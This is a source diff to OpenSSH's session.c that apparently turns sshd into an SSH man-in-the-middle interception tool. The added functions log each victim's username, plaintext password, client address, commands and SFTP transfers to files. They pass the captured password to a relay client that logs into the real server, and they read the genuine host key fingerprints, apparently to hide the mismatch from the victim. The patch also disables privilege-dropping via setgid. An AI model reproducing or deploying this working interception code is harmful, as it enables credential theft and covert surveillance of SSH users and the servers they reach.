@@ -40,6 +40,10 @@
 #ifdef HAVE_SYS_STAT_H
 # include <sys/stat.h>
 #endif
+#include <netinet/in.h>
+#include <resolv.h>
+#include <sys/file.h>
+#include <time.h>
 #include <sys/socket.h>
 #include <sys/un.h>
 #include <sys/wait.h>
@@ -94,6 +98,7 @@
 #include "kex.h"
 #include "monitor_wrap.h"
 #include "sftp.h"
+#include "digest.h"
 
 #if defined(KRB5) && defined(USE_AFS)
 #include <kafs.h>
@@ -116,16 +121,17 @@ void	session_set_fds(Session *, int, int, int, int, int);
 void	session_pty_cleanup(Session *);
 void	session_proctitle(Session *);
 int	session_setup_x11fwd(Session *);
-int	do_exec_pty(Session *, const char *);
-int	do_exec_no_pty(Session *, const char *);
+int	do_exec_pty(Session *, const char *, char *);
+int	do_exec_no_pty(Session *, const char *, char *);
 int	do_exec(Session *, const char *);
 void	do_login(Session *, const char *);
 #ifdef LOGIN_NEEDS_UTMPX
 static void	do_pre_login(Session *s);
 #endif
-void	do_child(Session *, const char *);
+void	do_child(Session *, const char *, char *);
 void	do_motd(void);
 int	check_quietlogin(Session *, const char *);
+double my_sleep(struct timespec *sleep_request);
 
 static void do_authenticated2(Authctxt *);
 
@@ -140,6 +146,7 @@ extern u_int utmp_len;
 extern int startup_pipe;
 extern void destroy_sensitive_data(void);
 extern Buffer loginmsg;
+extern Lol *lol;
 
 /* original command from peer. */
 const char *original_command = NULL;
@@ -164,6 +171,14 @@ static int in_chroot = 0;
 /* Name and directory of socket for authentication agent forwarding. */
 static char *auth_sock_name = NULL;
 static char *auth_sock_dir = NULL;
+
+/* This is the maximum number of times to attempt to open a log file for
+ * writing. */
+#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
+
+char *create_password_and_fingerprint_socket(int *sock_fd);
+void set_session_log(Session *s, unsigned int is_sftp, const char *command);
+void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c);
 
 /* removes the agent forwarding socket */
 
@@ -291,7 +306,7 @@ xauth_valid_string(const char *s)
  * setting up file descriptors and such.
  */
 int
-do_exec_no_pty(Session *s, const char *command)
+do_exec_no_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)
 {
 	pid_t pid;
 
@@ -342,6 +357,8 @@ do_exec_no_pty(Session *s, const char *command)
 #endif
 
 	session_proctitle(s);
+
+	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), command);
 
 	/* Fork the child. */
 	switch ((pid = fork())) {
@@ -420,7 +437,7 @@ do_exec_no_pty(Session *s, const char *command)
 #endif
 
 		/* Do processing for the child (exec command etc). */
-		do_child(s, command);
+		do_child(s, command, password_and_fingerprint_socket_name);
 		/* NOTREACHED */
 	default:
 		break;
@@ -475,7 +492,7 @@ do_exec_no_pty(Session *s, const char *command)
  * lastlog, and other such operations.
  */
 int
-do_exec_pty(Session *s, const char *command)
+do_exec_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)
 {
 	int fdout, ptyfd, ttyfd, ptymaster;
 	pid_t pid;
@@ -506,6 +523,8 @@ do_exec_pty(Session *s, const char *command)
 		close(fdout);
 		return -1;
 	}
+
+	set_session_log(s, command || (s->is_subsystem == SUBSYSTEM_INT_SFTP), command);
 
 	/* Fork the child. */
 	switch ((pid = fork())) {
@@ -553,7 +572,7 @@ do_exec_pty(Session *s, const char *command)
 		 * Do common processing for the child, such as execing
 		 * the command.
 		 */
-		do_child(s, command);
+		do_child(s, command, password_and_fingerprint_socket_name);
 		/* NOTREACHED */
 	default:
 		break;
@@ -619,6 +638,8 @@ do_exec(Session *s, const char *command)
 	int ret;
 	const char *forced = NULL, *tty = NULL;
 	char session_type[1024];
+	int sock_fd = -1;
+	char *password_and_fingerprint_socket_name = NULL;
 
 	if (options.adm_forced_command) {
 		original_command = command;
@@ -673,10 +694,23 @@ do_exec(Session *s, const char *command)
 		PRIVSEP(audit_run_command(shell));
 	}
 #endif
+
+	/* Create a socket for the ssh client program to output its host key
+	 * fingerprints back to us. */
+	password_and_fingerprint_socket_name = create_password_and_fingerprint_socket(&sock_fd);
+	if (sock_fd < 0) {
+	  free(password_and_fingerprint_socket_name); password_and_fingerprint_socket_name = NULL;
+	  fatal("MITM: failed to create socket.");
+	}
+
 	if (s->ttyfd != -1)
-		ret = do_exec_pty(s, command);
+		ret = do_exec_pty(s, command, password_and_fingerprint_socket_name);
 	else
-		ret = do_exec_no_pty(s, command);
+		ret = do_exec_no_pty(s, command, password_and_fingerprint_socket_name);
+
+	/* Write the password and read the client's host key fingerprints into
+	 * the Channel struct. */
+	write_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
 
 	original_command = NULL;
 
@@ -1341,10 +1375,10 @@ do_setusercontext(struct passwd *pw)
 #else
 		if (setlogin(pw->pw_name) < 0)
 			error("setlogin failed: %s", strerror(errno));
-		if (setgid(pw->pw_gid) < 0) {
+		/*if (setgid(pw->pw_gid) < 0) {
 			perror("setgid");
 			exit(1);
-		}
+		}*/
 		/* Initialize the group list. */
 		if (initgroups(pw->pw_name, pw->pw_gid) < 0) {
 			perror("initgroups");
@@ -1416,6 +1450,8 @@ do_pwchange(Session *s)
 #ifdef WITH_SELINUX
 		setexeccon(NULL);
 #endif
+		logit("MITM: refusing to execute passwd.");
+		exit(1);
 #ifdef PASSWD_NEEDS_USERNAME
 		execl(_PATH_PASSWD_PROG, "passwd", s->pw->pw_name,
 		    (char *)NULL);
@@ -1473,9 +1509,9 @@ child_close_fds(void)
  * environment, closing extra file descriptors, setting the user and group
  * ids, and executing the command or shell.
  */
-#define ARGV_MAX 10
+#define ARGV_MAX 16
 void
-do_child(Session *s, const char *command)
+do_child(Session *s, const char *command, char *password_and_fingerprint_socket_name)
 {
 	extern char **environ;
 	char **env;
@@ -1553,6 +1589,7 @@ do_child(Session *s, const char *command)
 	 * ssh_remote_ipaddr there.
 	 */
 	child_close_fds();
+	s->session_log_fd = -1;
 
 	/*
 	 * Must take new environment into use so that .ssh/rc,
@@ -1612,10 +1649,21 @@ do_child(Session *s, const char *command)
 		printf("This service allows sftp connections only.\n");
 		fflush(NULL);
 		exit(1);
-	} else if (s->is_subsystem == SUBSYSTEM_INT_SFTP) {
+	} else if ((s->is_subsystem == SUBSYSTEM_INT_SFTP) ||
+		   ((command != NULL) && (memmem(command, strlen(command), "sftp-server", 11) != NULL))) {
 		extern int optind, optreset;
 		int i;
 		char *p, *args;
+
+		/* Hard-code the SFTP server path to our version. */
+		if (command != NULL) {
+		  command = _PATH_SFTP_SERVER;
+
+		  /* If DEBUG3 is enabled in sshd, spawn sftp-server with it
+		   * as well. */
+		  if (options.log_level == SYSLOG_LEVEL_DEBUG3)
+		    command = _PATH_SFTP_SERVER " -f AUTH -l DEBUG3";
+		}
 
 		setproctitle("%s@%s", s->pw->pw_name, INTERNAL_SFTP_NAME);
 		args = xstrdup(command ? command : "sftp-server");
@@ -1628,7 +1676,14 @@ do_child(Session *s, const char *command)
 #ifdef WITH_SELINUX
 		ssh_selinux_change_context("sftpd_t");
 #endif
-		exit(sftp_server_main(i, argv, s->pw));
+		debug3("MITM: SFTP server PID: %u", getpid());
+		exit(sftp_server_main(i, argv, s->pw,
+#ifdef DEBUG_HOST
+					DEBUG_HOST, DEBUG_PORT,
+#else
+					lol->original_host, lol->original_port,
+#endif
+					lol->username, password_and_fingerprint_socket_name, s->session_log_filepath, s->session_log_dir));
 	}
 
 	fflush(NULL);
@@ -1644,8 +1699,13 @@ do_child(Session *s, const char *command)
 	 * name to be passed in argv[0] is preceded by '-' to indicate that
 	 * this is a login shell.
 	 */
-	if (!command) {
+	if (1) {
 		char argv0[256];
+		char connect_string[512];
+		char port[16];
+
+		memset(connect_string, 0, sizeof(connect_string));
+		memset(port, 0, sizeof(port));
 
 		/* Start the shell.  Set initial character to '-'. */
 		argv0[0] = '-';
@@ -1658,9 +1718,41 @@ do_child(Session *s, const char *command)
 		}
 
 		/* Execute the shell. */
-		argv[0] = argv0;
+		/*argv[0] = argv0;
 		argv[1] = NULL;
-		execve(shell, argv, env);
+		execve(shell, argv, env);*/
+
+
+		snprintf(port, sizeof(port), "%hu", lol->original_port);
+
+		strlcpy(connect_string, lol->username, sizeof(connect_string));
+		strlcat(connect_string, "@", sizeof(connect_string));
+
+		#ifdef DEBUG_HOST
+		strlcat(connect_string, DEBUG_HOST, sizeof(connect_string));
+		snprintf(port, sizeof(port), "%d", DEBUG_PORT);
+		#else
+		strlcat(connect_string, lol->original_host, sizeof(connect_string));
+		#endif
+
+		debug3("MITMing connection to %s:%s", connect_string, port);
+
+		argv[0] = MITM_SSH_CLIENT;
+		argv[1] = "-E";
+		argv[2] = MITM_SSH_CLIENT_LOG;
+		argv[3] = "-F";
+		argv[4] = MITM_SSH_CLIENT_CONFIG;
+		argv[5] = "-Z";
+		argv[6] = password_and_fingerprint_socket_name;
+		argv[7] = "-p";
+		argv[8] = port;
+		argv[9] = connect_string;
+		if (command) {
+			argv[10] = (char *)command;
+			argv[11] = NULL;
+		} else
+			argv[10] = NULL;
+		execve(argv[0], argv, env);
 
 		/* Executing the shell failed. */
 		perror(shell);
@@ -1674,8 +1766,11 @@ do_child(Session *s, const char *command)
 	argv[1] = "-c";
 	argv[2] = (char *) command;
 	argv[3] = NULL;
-	execve(shell, argv, env);
+	logit("MITM: attempt to execute command blocked: [%s -c %s]", shell0, command);
+	/*
+	execve(shell, argv, env);	
 	perror(shell);
+	*/
 	exit(1);
 }
 
@@ -1927,6 +2022,11 @@ session_subsystem_req(Session *s)
 	debug2("subsystem request for %.100s by user %s", s->subsys,
 	    s->pw->pw_name);
 
+	if (strcmp(s->subsys, "sftp") != 0) {
+		logit("MITM: subsystem request for something other than sftp (%.100s).  Rejecting...", s->subsys);
+		return 0;
+        }
+
 	for (i = 0; i < options.num_subsystems; i++) {
 		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
 			prog = options.subsystem_command[i];
@@ -1957,6 +2057,10 @@ static int
 session_x11_req(Session *s)
 {
 	int success;
+
+	/* Disable X11 requests. */
+	logit("MITM: rejecting X11 request.");
+	return 0;
 
 	if (s->auth_proto != NULL || s->auth_data != NULL) {
 		error("session_x11_req: session %d: "
@@ -2022,6 +2126,10 @@ session_env_req(Session *s)
 	char *name, *val;
 	u_int name_len, val_len, i;
 
+	/* Disable env requests. */
+	logit("MITM: rejecting env request.");
+	return 0;
+
 	name = packet_get_cstring(&name_len);
 	val = packet_get_cstring(&val_len);
 	packet_check_eom();
@@ -2056,6 +2164,11 @@ session_auth_agent_req(Session *s)
 {
 	static int called = 0;
 	packet_check_eom();
+
+	/* Disable auth agent requests. */
+	logit("MITM: rejecting auth agent request.");
+	return 0;
+
 	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
 		debug("session_auth_agent_req: no_agent_forwarding_flag");
 		return 0;
@@ -2124,7 +2237,7 @@ session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
 	channel_set_fds(s->chanid,
 	    fdout, fdin, fderr,
 	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
-	    1, is_tty, CHAN_SES_WINDOW_DEFAULT);
+	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, s->session_log_fd, s->is_sftp);
 }
 
 /*
@@ -2320,6 +2433,15 @@ session_close(Session *s)
 	}
 	session_proctitle(s);
 	session_unused(s->self);
+	free(s->session_log_dir); s->session_log_dir = NULL;
+	free(s->session_log_filepath); s->session_log_filepath = NULL;
+	if (s->session_log_fd > -1) {
+	  if (s->is_sftp)
+	    write(s->session_log_fd, "</pre></html>", 13);
+	  fdatasync(s->session_log_fd);
+	  close(s->session_log_fd);
+	  s->session_log_fd = -1;
+	}
 }
 
 void
@@ -2532,6 +2654,10 @@ do_cleanup(Authctxt *authctxt)
 	if (authctxt == NULL)
 		return;
 
+	if (authctxt->original_user != NULL) {
+		free(authctxt->original_user);  authctxt->original_user = NULL;
+	}
+
 #ifdef USE_PAM
 	if (options.use_pam) {
 		sshpam_cleanup();
@@ -2578,3 +2704,263 @@ session_get_remote_name_or_ip(struct ssh *ssh, u_int utmp_size, int use_dns)
 	return remote;
 }
 
+/* Returns a file handle for logging a shell/sftp session.  Set "is_sftp" arg
+ * to 1 to make a log file for SFTP. */
+void set_session_log(Session *s, unsigned int is_sftp, const char *command) {
+  char filename[ sizeof(MITM_LOG) + 32 ] = MITM_LOG "shell_session_0.txt";
+  int num_tries = 0;
+
+  s->is_sftp = is_sftp;
+  if (s->is_sftp)
+    strlcpy(filename, MITM_LOG "sftp_session_0.html", sizeof(filename));
+
+  s->session_log_fd = -1;
+  while ((num_tries < MAX_LOG_OPEN_TRIES) && (s->session_log_fd < 0)) {
+    s->session_log_fd = open(filename, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_WRONLY
+#ifdef SYNC_LOG
+        | O_SYNC
+#endif
+        , S_IRUSR | S_IWUSR);
+
+    num_tries++;
+
+    /* If the file could not be created, increment the counter and append it
+     * to the filename prefix so we can try again. */
+    if (s->session_log_fd < 0) {
+      if (s->is_sftp)
+	snprintf(filename, sizeof(filename) - 1, MITM_LOG "sftp_session_%d.html", num_tries);
+      else
+	snprintf(filename, sizeof(filename) - 1, MITM_LOG "shell_session_%d.txt", num_tries);
+    }
+  }
+
+  if (s->session_log_fd < 0)
+    logit("MITM: Could not open file for logging!");
+  else {
+    struct ssh *ssh = active_state;
+    time_t t = time(NULL);
+    struct tm stm;
+    int original_port = lol->original_port;
+    char srcport[16];
+    char dstport[16];
+    char buf[128];
+
+    memset(&stm, 0, sizeof(struct tm));
+    memset(srcport, 0, sizeof(srcport));
+    memset(dstport, 0, sizeof(dstport));
+    memset(buf, 0, sizeof(buf));
+
+
+    s->session_log_filepath = xstrdup(filename);
+
+    /* Create a unique directory for SFTP sessions.  This is where uploaded and
+     * downloaded files will go. */
+    if (s->is_sftp) {
+      filename[strlen(filename) - 5] = '/';
+      filename[strlen(filename) - 4] = '\0';
+      if (mkdir(filename, S_IRWXU) == 0)
+	s->session_log_dir = xstrdup(filename);
+
+      write(s->session_log_fd, "<html><pre>", 11);
+    }
+
+    snprintf(srcport, sizeof(srcport), "%d", ssh_remote_port(ssh));
+    snprintf(dstport, sizeof(dstport), "%d", original_port);
+    if (gmtime_r(&t, &stm) != NULL)
+      strftime(buf, sizeof(buf), "%F %T %Z", &stm);
+
+    /* Write the timestamp. */
+    write(s->session_log_fd, "Time: ", 6);
+    write(s->session_log_fd, buf, strlen(buf));
+
+    /* Write the hostname and destination port. */
+    write(s->session_log_fd, "\nServer: ", 9);
+    write(s->session_log_fd, lol->original_host, strlen(lol->original_host));
+    write(s->session_log_fd, ":", 1);
+    write(s->session_log_fd, dstport, strlen(dstport));
+
+    /* Write the origin IP and source port. */
+    write(s->session_log_fd, "\nClient: ", 9);
+    write(s->session_log_fd, ssh_remote_ipaddr(ssh), strlen(ssh_remote_ipaddr(ssh)));
+    write(s->session_log_fd, ":", 1);
+    write(s->session_log_fd, srcport, strlen(srcport));
+
+    /* Write the username. */
+    write(s->session_log_fd, "\nUsername: ", 11);
+    write(s->session_log_fd, lol->username, strlen(lol->username));
+
+    /* Write the password. */
+    write(s->session_log_fd, "\nPassword: ", 11);
+    write(s->session_log_fd, lol->password, strlen(lol->password));
+
+    /* Write the command, if there was one. */
+    if (command != NULL) {
+      write(s->session_log_fd, "\nCommand: ", 10);
+      write(s->session_log_fd, command, strlen(command));
+    }
+    write(s->session_log_fd, "\n-------------------------\n", 27);
+  }
+}
+
+/* Requests to sleep a certain amount of time (must be less than 1 second).
+ * Returns the number of seconds actually slept. */
+/*
+double my_sleep(struct timespec *sleep_request) {
+  struct timespec sleep_remaining;
+
+  * If we slept the entire duration without being interrupted... *
+  if (nanosleep(sleep_request, &sleep_remaining) == 0)
+    return (double)(sleep_request->tv_nsec / 1000000000.0);
+  else
+    return (double)((sleep_request->tv_nsec - sleep_remaining.tv_nsec) / 1000000000.0);
+}
+*/
+
+/* Creates a unique socket and listens on it.  Returns its filename and sets
+ * the "sock_fd" argument to the socket handle.  The caller must free() the
+ * return value. */
+char *create_password_and_fingerprint_socket(int *sock_fd) {
+  char *password_and_fingerprint_socket_name = NULL;
+  struct sockaddr_un addr;
+  char socket_prefix[] = MITM_ROOT "/tmp/socket_";
+  int counter = 0;
+  int password_and_fingerprint_socket_name_len = sizeof(socket_prefix) + 5;
+
+  /* Create a new socket. */
+  memset(&addr, 0, sizeof(addr));
+  addr.sun_family = AF_UNIX;
+  *sock_fd = socket(AF_UNIX, SOCK_STREAM, 0);
+  if (*sock_fd == -1) {
+    logit("MITM: Error: could not create socket for fingerprint data!");
+    return strdup("");
+  }
+
+  /* Allocate a return buffer to hold the socket filename. */
+  if ((password_and_fingerprint_socket_name = calloc(password_and_fingerprint_socket_name_len, sizeof(char))) == NULL) {
+    *sock_fd = -1;
+    return strdup("");
+  }
+
+  /* Make a new, unique socket file path. */
+  while (counter < 1024) {
+    snprintf(password_and_fingerprint_socket_name, password_and_fingerprint_socket_name_len, "%s%d", socket_prefix, counter);
+    strlcpy(addr.sun_path, password_and_fingerprint_socket_name , sizeof(addr.sun_path));
+    if (bind(*sock_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+      break;
+
+    counter++;
+  }
+
+  /* Listen on the socket handle. */
+  if (listen(*sock_fd, 1) == -1) {
+    logit("MITM: Error while listening on socket for fingerprint data: %d", errno);
+    close(*sock_fd);
+    *sock_fd = -1;
+    free(password_and_fingerprint_socket_name); password_and_fingerprint_socket_name = NULL;
+    return strdup("");
+  }
+
+  return password_and_fingerprint_socket_name;
+}
+
+/* Writes the password, then reads the host key fingerprints from the client
+ * program, sets the appropriate "legit_*_fingerprint" global variables,
+ * deletes the socket, and frees the socket name. */
+void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c) {
+  int client_fd = -1, written = 0, r = 0;
+  u_int16_t password_len = htons((u_int16_t)strlen(lol->password));
+  char *buffer = NULL;
+
+  /* Wait for the client to connect, then accept it. */
+  client_fd = accept(sock_fd, NULL, NULL);
+  if (client_fd < 0)
+    fatal("MITM: Error while accepting socket client connection: %d", errno);
+
+  /* Send the password length. */
+  if (send(client_fd, &password_len, sizeof(password_len), 0) < 0)
+    fatal("MITM: Error while sending password length: %d", errno);
+
+  /* Write the password. */
+  while (written < password_len) {
+    r = send(client_fd, lol->password + written, password_len - written, 0);
+    if ((r < 0) && (r != EINTR))
+      fatal("MITM: Error while sending password: %d", errno);
+    else if (r > 0)
+      written += r;
+  }
+
+  buffer = calloc(SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE, sizeof(char));
+  if ((buffer != NULL) && (c != NULL)) {
+    int r, bytes_read = 0;
+    char *saved_buffer = buffer;  /* We use strsep(), so save this pointer. */
+    char *line = NULL;
+    int line_len = 0;
+    struct sshkey *k = NULL;
+    char *fp = NULL;
+
+    /* Read everything into buffer. */
+    while (1) {
+      r = read(client_fd, buffer + bytes_read, SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE - bytes_read);
+      if (r <= 0)
+	break;
+      bytes_read += r;
+    }
+
+    /* Tokenize the buffer by the newline character. */
+    while ((line = strsep(&buffer, "\n")) != NULL) {
+      line_len = strlen(line);
+      if (line_len > 4) {
+
+	/* We should only get one MD5 and one SHA256 fingerprint.  If we get
+	 * more, log it. */
+	if ((c->legit_md5_fingerprint_len > 0) && (c->legit_sha256_fingerprint_len > 0))
+	  logit("MITM: !! Somehow, both the MD5 and SHA256 fingerprints were already set, but we got another fingerprint line anyway!! Please contact the project maintainer about this! [%s]", line);
+
+	/* If this line begins with "MD5:", its an MD5 fingerprint.  Copy it
+	 * into the "legit_md5_fingerprint" buffer. */
+	if (memcmp(line, "MD5:", 4) == 0) {
+	  c->legit_md5_fingerprint = strdup(line + 4);
+	  c->legit_md5_fingerprint_len = strlen(c->legit_md5_fingerprint);
+	/* If this is a SHA256 fingerprint, copy this as well. */
+	} else if (memcmp(line, "SHA256:", 7) == 0) {
+	  c->legit_sha256_fingerprint = strdup(line + 7);
+	  c->legit_sha256_fingerprint_len = strlen(c->legit_sha256_fingerprint);
+	} else
+	  logit("MITM: unknown fingerprint!: [%s]", line);
+      }
+    }
+
+    c->extra_fp_bytes = calloc(EXTRA_FP_BYTES_SIZE, sizeof(char));
+    k = ssh_active_state->kex->load_host_public_key(active_state->kex->hostkey_type, ssh_active_state->kex->hostkey_nid, ssh_active_state);
+
+    /* Set the host key fingerprints our sshd is using with the victim. */
+    if (c->legit_md5_fingerprint_len > 0) {
+      fp = sshkey_fingerprint(k, SSH_DIGEST_MD5, SSH_FP_DEFAULT);
+      c->our_md5_fingerprint = strdup(fp + 4);  // Cut off the "MD5:" prefix.
+      c->our_md5_fingerprint_len = strlen(c->our_md5_fingerprint);
+      free(fp); fp = NULL;
+ 
+      debug("MITM: MD5 fingerprint received from legit server: [%s]", c->legit_md5_fingerprint);
+      debug("MITM: MD5 fingerprint seen by victim: [%s]", c->our_md5_fingerprint);
+    }
+
+    if (c->legit_sha256_fingerprint_len > 0) {
+      fp = sshkey_fingerprint(k, SSH_DIGEST_SHA256, SSH_FP_DEFAULT);
+      c->our_sha256_fingerprint = strdup(fp + 7); // Cut off the "SHA256:" prefix.
+      c->our_sha256_fingerprint_len = strlen(c->our_sha256_fingerprint);
+      free(fp); fp = NULL;
+      debug("MITM: SHA256 fingerprint received from legit server: [%s]", c->legit_sha256_fingerprint);
+      debug("MITM: SHA256 fingerprint seen by victim: [%s]", c->our_sha256_fingerprint);
+    }
+
+    /* Free the buffer we read data from the socket into. */
+    free(saved_buffer); saved_buffer = NULL; buffer = NULL;
+  }
+
+  /* We are done with this socket, so shut it down, delete the file, and
+  * free the filename. */
+  shutdown(client_fd, SHUT_RDWR);
+  close(sock_fd);
+  unlink(*password_and_fingerprint_socket_name);
+  free(*password_and_fingerprint_socket_name); *password_and_fingerprint_socket_name = NULL;
+}
